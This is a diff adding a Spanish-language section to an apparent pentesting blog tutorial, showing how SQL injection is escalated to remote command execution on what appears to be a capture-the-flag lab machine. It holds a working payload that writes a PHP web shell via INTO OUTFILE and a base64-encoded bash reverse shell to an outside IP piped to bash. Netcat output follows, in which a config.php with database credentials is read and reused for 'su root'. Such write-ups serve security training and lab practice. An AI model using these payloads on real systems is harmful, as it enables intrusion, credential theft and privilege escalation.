@@ -558,6 +558,78 @@ Para obtener finalmente como respuesta la inyección insertada:
 
 [![sqlinjectxml3](/images/sqlinjectxml3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectxml3.png)
 
+### SQL Injection a RCE (Remote Command Execution)
+
+Por medio de la siguiente inyección es posible por la cláusula ```UNION``` combinar los resultados de dos o más SELECTs o para este caso con la cláusula ```INTO OUTFILE``` en un solo resultado que permite escribir los resultados de un SELECT en un archivo en el sistema de archivos del servidor.
+
+```sql
+' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
+```
+
+Aplicamos esta inyección en BurpSuite de la siguiente forma:
+
+[![sqlinjectrce1](/images/sqlinjectrce1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectrce1.png)
+
+Luego al hacer un "follow redirection" podemos confirmar la inyección exitosa.
+
+[![sqlinjectrce2](/images/sqlinjectrce2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectrce2.png)
+
+ En nuestro navegador podremos ejecutar comandos y ver archivos senibles como "config.php" que contiene credenciales válidas.
+
+[![sqlinjectrce3](/images/sqlinjectrce3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectrce3.png)
+
+[![sqlinjectrce4](/images/sqlinjectrce4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectrce4.png)
+
+Para recibir una shell inversa debemos realizar convertir el siguiente comando en base64: 
+
+```bash
+┌─[root@kali]─[/home/user/demo/]
+└──╼ echo "bash -i >& /dev/tcp/10.10.14.9/4646 0>&1" | base64               
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ2NDYgMD4mMQo=
+```
+
+Y si nos ponemos a la escucha con ```nc -nlvp 4646```, y en Burpsuite realizamos los siguientes pasos podremos obtener la shell.
+
+```bash
+echo "YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ2NDYgMD4mMQo="|base64 -d|bash
+```
+
+[![sqlinjectrce5](/images/sqlinjectrce5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectrce5.png)
+
+[![sqlinjectrce6](/images/sqlinjectrce6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectrce6.png)
+
+```bash
+┌─[root@kali]─[/home/user/demo/]
+└──╼ nc -nlvp 4646  
+listening on [any] 4646 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.116] 42720
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@validation:/var/www/html$ whoami
+whoami
+www-data
+www-data@validation:/var/www/html$ ls
+ls
+account.php
+config.php
+css
+index.php
+js
+shell.php
+www-data@validation:/var/www/html$ cat config.php
+cat config.php
+<?php
+  $servername = "127.0.0.1";
+  $username = "uhc";
+  $password = "uhc-9qual-global-pw";
+  $dbname = "registration";
+
+  $conn = new mysqli($servername, $username, $password, $dbname);
+?>
+www-data@validation:/var/www/html$
+```
+
+Con esa contraseña obtenida es posible acceder al usuario root con ```su root```.
 
 ### Recomendaciones
 
